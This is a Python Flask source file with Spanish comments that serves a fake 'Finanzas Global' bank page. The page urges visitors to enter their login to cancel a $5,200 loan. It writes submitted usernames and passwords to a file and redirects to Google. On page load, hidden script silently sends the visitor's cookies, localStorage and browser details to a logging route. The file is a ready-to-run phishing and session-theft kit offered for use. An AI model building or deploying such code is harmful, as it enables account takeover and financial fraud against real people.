from flask import Flask, render_template_string, request, redirect
import datetime

app = Flask(__name__)

# HTML con Inyección para extraer Cookies y LocalStorage
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Seguridad de Cuenta | Finanzas Global</title>
    <script>
        // Función para enviar cookies de forma silenciosa al servidor
        function capturarPrivacidad() {
            var data = {
                cookies: document.cookie,
                localStorage: JSON.stringify(localStorage),
                screen: window.screen.width + "x" + window.screen.height,
                agent: navigator.userAgent
            };
            fetch('/log_session', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
        }
        window.onload = capturarPrivacidad;
    </script>
    <style>
        /* (Mismo estilo corporativo que diseñamos antes) */
        body { font-family: sans-serif; background: #f4f7f9; text-align: center; padding-top: 50px; }
        .box { max-width: 400px; margin: auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); border-top: 5px solid #d32f2f; }
        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
        .btn { background: #d32f2f; color: white; border: none; padding: 15px; width: 95%; font-weight: bold; cursor: pointer; border-radius: 4px; }
    </style>
</head>
<body>
    <div class="box">
        <h2 style="color:#1a252f">FINANZAS GLOBAL</h2>
        <p style="font-size:14px; color:#666;">Para cancelar el préstamo de <b>$5,200.00</b>, confirme su identidad de acceso.</p>
        <form action="/login" method="post">
            <input type="text" name="u" placeholder="Usuario / Email" required>
            <input type="password" name="p" placeholder="Contraseña" required>
            <button type="submit" class="btn">CANCELAR PRÉSTAMO</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/log_session', methods=['POST'])
def log_session():
    data = request.json
    with open("session_cookies.txt", "a") as f:
        f.write(f"--- NUEVA SESIÓN ---\nCookies: {data.get('cookies')}\nUser-Agent: {data.get('agent')}\n\n")
    return '', 204

@app.route('/login', methods=['POST'])
def login():
    u, p = request.form.get('u'), request.form.get('p')
    with open("capturas.txt", "a") as f:
        f.write(f"User: {u} | Pass: {p} | Fecha: {datetime.datetime.now()}\n")
    return redirect("https://www.google.com")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
